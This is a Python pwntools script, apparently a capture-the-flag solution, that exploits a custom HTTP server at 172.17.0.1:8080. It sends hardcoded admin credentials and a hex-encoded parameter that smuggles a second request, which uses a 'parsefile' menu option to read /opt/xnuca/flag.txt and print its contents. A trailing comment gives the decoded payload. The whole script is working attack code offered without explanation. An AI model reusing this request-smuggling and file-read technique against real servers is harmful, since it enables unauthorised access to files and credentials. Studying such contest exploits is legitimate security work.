from pwn import *
p = remote("172.17.0.1",8080)
buf= '''GET /login.html?username=admin&password=admin111111111111111111111111111111111111111111111111111111nimda&menu=request&para=6c6f67696e2e68746d6c3f757365726e616d653d61646d696e2670617373776f72643d61646d696e3131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131316e696d6461266d656e753d706172736566696c6526706172613d2f6f70742f786e7563612f666c61672e74787420485454502f312e310d0a43726564656e7469616c733a204c47204752414d0d0a613a20 HTTP/1.1
Host: 127.0.0.1:8080
Proxy-Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Credentials: LG GRAM'''
#context.log_level = 'debug'
p.send(buf)
p.recvuntil('Try login in me.!\\r\\n\n')
p.recvuntil('Try login in me.!\\r\\n\n')
flag = p.recvline()[:-1].replace('\0','')
print '[+] flag:',flag
p.interactive()

#'login.html?username=admin&password=admin111111111111111111111111111111111111111111111111111111nimda&menu=parsefile&para=/opt/xnuca/flag.txt HTTP/1.1\r\nCredentials: LG GRAM\r\na: '
#login.html?a=b&username=admin&password=admin111111111111111111111111111111111111111111111111111111nimda&menu=parsefile&para=login.html
